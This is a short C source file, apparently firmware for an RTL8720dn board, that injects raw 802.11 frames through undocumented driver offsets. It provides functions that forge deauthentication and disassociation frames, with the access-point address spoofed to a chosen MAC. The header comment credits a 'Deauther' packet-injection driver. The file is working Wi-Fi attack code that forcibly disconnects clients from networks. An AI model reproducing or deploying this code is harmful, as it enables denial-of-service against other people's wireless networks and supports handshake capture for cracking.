// ============================================================
// Raw 802.11 frame TX implementation (see wifi_tx.h).
// Byte-offset frame-descriptor handling identical to the proven
// RTL8720dn-Deauther packet-injection driver.
// ============================================================
#include <string.h>
#include "wifi_tx.h"

bool wifi_tx_raw_frame(void* frame, size_t length) {
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xa80);

  if (frame_control == 0) return false;     // TX pool exhausted
  update_mgntframe_attrib(ptr, frame_control + 8);
  memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
  uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)(frame_control + 0x14) = length;
  *(uint32_t *)(frame_control + 0x18) = length;
  dump_mgntframe(ptr, frame_control);
  return true;
}

bool wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  return wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

bool wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  return wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
}
